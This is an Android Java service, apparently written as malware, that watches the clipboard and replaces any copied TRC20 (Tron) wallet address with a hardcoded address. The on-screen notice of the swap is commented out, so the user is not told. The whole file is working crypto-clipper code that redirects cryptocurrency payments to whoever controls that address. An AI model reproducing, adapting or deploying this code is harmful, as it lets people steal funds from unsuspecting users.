package com.example.test1;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;

public class ClipboardMonitorService extends Service {
    private ClipboardManager clipboardManager;
    private String targetAddress = "TAjZC12p9VALMxCxGDXs2NDhuqBSCLkVRH";

    @Override
    public void onCreate() {
        super.onCreate();
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);

        // 创建前台通知
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
        }
        Notification notification = new NotificationCompat.Builder(this, "CLIPBOARD_CHANNEL")
                .setContentTitle("Clipboard Monitor")
                .setContentText("剪贴板监听服务正在运行")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
        startForeground(1, notification);

        // 添加剪贴板监听器
        if (clipboardManager != null) {
            clipboardManager.addPrimaryClipChangedListener(clipboardListener);
        }
    }

    private final ClipboardManager.OnPrimaryClipChangedListener clipboardListener =
            new ClipboardManager.OnPrimaryClipChangedListener() {
                @Override
                public void onPrimaryClipChanged() {
                    Handler handler = new Handler(Looper.getMainLooper());
                    handler.post(() -> {
                        if (clipboardManager != null && clipboardManager.hasPrimaryClip()) {
                            ClipData primaryClip = clipboardManager.getPrimaryClip();
                            if (primaryClip != null && primaryClip.getItemCount() > 0) {
                                CharSequence clipboardText = primaryClip.getItemAt(0).getText();
                                if (clipboardText != null &&
                                        clipboardText.toString().matches("^T[a-zA-Z0-9]{33}$")) { // TRC20地址正则匹配
                                    clipboardManager.setPrimaryClip(
                                            ClipData.newPlainText("TRC20 Address", targetAddress)
                                    );
                                   // Toast.makeText(getApplicationContext(),
                                    //        "地址已替换为：" + targetAddress, Toast.LENGTH_SHORT).show();
                                }
                            }
                        }
                    });
                }
            };

    @Override
    public void onDestroy() {
        if (clipboardManager != null) {
            clipboardManager.removePrimaryClipChangedListener(clipboardListener);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // 服务不需要绑定，返回 null
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "CLIPBOARD_CHANNEL",
                    "Clipboard Monitor Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
}
